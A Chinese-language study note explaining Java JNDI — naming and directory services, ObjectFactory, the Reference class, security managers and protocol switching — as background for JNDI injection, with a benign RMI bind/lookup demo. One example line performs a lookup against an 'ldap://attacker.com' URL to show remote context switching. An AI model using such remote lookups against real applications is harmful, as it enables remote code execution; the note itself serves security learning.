# JNDI

## 概述

JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的**命名服务**和**目录服务**，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等

JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等

Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。

![Untitled](JNDI%20attachments/Untitled.png)

### 命名服务（Name Server）

命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如说RMI和DNS都可以称为命名服务，在这里就特指Java Naming

命名服务是一种键值对的绑定，使应用程序可以通过键检索值。

下面是几个重要概念

- **Bindings**：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。
- **Context**：上下文，一个上下文中对应着**一组名称到对象的绑定关系**，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。
- **References**：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。

### 目录服务（Diretory Service）

目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。

JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。

常见目录服务

- LDAP： 轻型目录访问协议
- Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；
- 其他基于 X.500 (目录服务的标准) 实现的目录服务；

### ****JNDI SPI****

JNDI 架构上主要包含两个部分，即 Java 的应用层接口和 SPI

SPI（Service Provider Interface），即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。

JDK 中包含了下述内置的命名目录服务:

- RMI: Java Remote Method Invocation，Java 远程方法调用
- LDAP: 轻量级目录访问协议
- CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)
- DNS（域名转换协议）

### ****ObjectFactory****

Object Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。

JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上

### 代码示例

JNDI中绑定与查找的方法：

- bind：将名称绑定到对象中；
- lookup：通过名字检索执行的对象；

这引用mi1k7ea基于RMI写的基本用法demo

Person类

```java
package org.jndi;

import java.io.Serializable;
import java.rmi.Remote;

public class Person implements Remote, Serializable {
    private static final longserialVersionUID= 1L;
    private String name;
    private String password;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String toString(){
        return "name:"+name+" password:"+password;
    }
}
```

Server_Client.java

服务端和客户端的代码写在一起，分为两个部分。

第一部分是initPerson()函数即服务端，其通过JNDI实现RMI服务，并通过JNDI的bind()函数将实例化的Person对象绑定到RMI服务中；

第二部分是findPerson()函数即客户端，其通过JNDI的lookup方法来检索person对象并输出出来：

```java
package org.jndi;

import javax.naming.*;
import java.rmi.registry.LocateRegistry;

public class Server_Client {
    public static void initPerson() throws Exception{
        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
        LocateRegistry.createRegistry(6666);
        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        System.setProperty(Context.PROVIDER_URL, "rmi://localhost:6666");

        //初始化
        InitialContext ctx = new InitialContext();

        //实例化person对象
        Person p = new Person();
        p.setName("mi1k7ea");
        p.setPassword("Niubility!");

        //person对象绑定到JNDI服务中，JNDI的名字叫做：person。
        ctx.bind("person", p);
        ctx.close();
    }

    public static void findPerson() throws Exception{
        //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了
        InitialContext ctx = new InitialContext();

        //通过lookup查找person对象
        Person person = (Person) ctx.lookup("person");

        //打印出这个对象
        System.out.println(person.toString());
        ctx.close();
    }

    public static void main(String[] args) throws Exception {
        initPerson();
        findPerson();
    }
}
}
```

![Untitled](JNDI%20attachments/Untitled%201.png)

看代码

![Untitled](JNDI%20attachments/Untitled%202.png)

在JNDI中通过context来对RMI来进行了绑定和初始化

在IDEA中通过注释掉相应的import可以清晰看出在JNDI中实现RMI服务依赖于`javax.naming`这个包来实现的也就是上面提到的**命名服务（Java Naming）**，而纯RMI是通过`java.rmi`这个包来实现绑定和检索的

### Reference类

Reference类表示对存在于命名/目录系统以外的对象的引用。

Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。

在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。

几个比较关键的属性：

- className：远程加载时所使用的类名；
- classFactory：加载的class中需要实例化类的名称；
- classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议

### ****远程代码和安全管理器****

****Java中的安全管理器****

> Java中的对象分为本地对象和远程对象，本地对象是默认为可信任的，但是远程对象是不受信任的。比如，当我们的系统从远程服务器加载一个对象，为了安全起见，JVM就要限制该对象的能力，比如禁止该对象访问我们本地的文件系统等，这些在现有的JVM中是依赖安全管理器（SecurityManager）来实现的。
> 
> 
> ![Untitled](JNDI%20attachments/Untitled%203.png)
> 
> JVM中采用的最新模型见上图，引入了“域”的概念，在不同的域中执行不同的权限。JVM会把所有代码加载到不同的系统域和应用域，系统域专门负责与关键资源进行交互，而应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有了当前域的全部权限。
> 
> 关于安全管理机制，可以详细阅读：
> 
> [http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/](http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/)
> 

### **JNDI的安全管理器**

这部分在后面绕过高版本JDK限制中也会具体讲到。

> 对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制：
> 
> 
> ![Untitled](JNDI%20attachments/Untitled%204.png)
> 
> 针对以上特性，黑客可能会找到一些特殊场景，利用两者的差异来执行恶意代码
> 

### ****JNDI协议动态转换****

在上面的Demo中，展示了初始化配置JNDI设置时预先指定其上下文环境（RMI、LDAP、CORBA等）

还有一种写法：

```java
Properties env = new Properties();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
Context ctx = new InitialContext(env);
```

虽然已经设置了上下文环境为RMI服务，但是在使用lookup()和search()的时候，可以通过URL的格式来转换上下文环境

`Person person = (Person)ctx.lookup("ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com");`

这样代码跟踪一下：

![Untitled](JNDI%20attachments/Untitled%205.png)

很明显通过`String scheme = *getURLScheme*(name);`会重新去尝试解析URL中的协议，如果存在的话会重新获取其上下文环境